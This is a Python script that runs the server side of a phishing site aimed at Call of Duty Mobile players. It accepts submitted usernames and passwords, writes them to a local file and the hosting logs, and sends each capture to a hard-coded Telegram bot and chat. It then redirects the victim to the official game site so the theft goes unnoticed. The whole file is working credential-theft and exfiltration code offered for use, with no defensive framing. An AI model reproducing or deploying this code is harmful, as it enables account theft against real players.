#!/usr/bin/env python3
import http.server
import socketserver
import urllib.parse
import datetime
import os
import urllib.request

PORT = int(os.environ.get("PORT", 8000))

# --- TELEGRAM CONFIG ---
TELEGRAM_BOT_TOKEN = "8806187111:AAH2xPa8L6NLIG07ecojvIGzYDaqCFNMrPA"   # Paste your Bot Token here
TELEGRAM_CHAT_ID = "7174097631"     # Paste your Chat ID here

def send_telegram(message):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = urllib.parse.urlencode({
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "Markdown"
        }).encode('utf-8')
        
        req = urllib.request.Request(url, data=payload)
        urllib.request.urlopen(req)
    except Exception as e:
        print(f"Telegram Error: {e}", flush=True)

class CredentialHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        post_params = urllib.parse.parse_qs(post_data.decode('utf-8'))
        
        username = post_params.get('username', [''])[0]
        password = post_params.get('password', [''])[0]
        
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"{timestamp} | Username: {username}, Password: {password}\n"
        
        # Write to file
        with open("credentials.txt", "a") as log_file:
            log_file.write(log_entry)
        
        # Print to Render Logs
        print(f"\n========== CAPTURED ==========\n{log_entry}============================\n", flush=True)
        
        # Send to Telegram
        telegram_msg = f"🎯 *New CODM Capture*\nTime: {timestamp}\nUser: `{username}`\nPass: `{password}`"
        send_telegram(telegram_msg)
        
        # Redirect to official site
        self.send_response(302)
        self.send_header("Location", "https://www.callofduty.com/mobile")
        self.end_headers()

    def do_GET(self):
        super().do_GET()

with socketserver.TCPServer(("0.0.0.0", PORT), CredentialHandler) as httpd:
    print(f"Server running on port {PORT}")
    httpd.serve_forever()
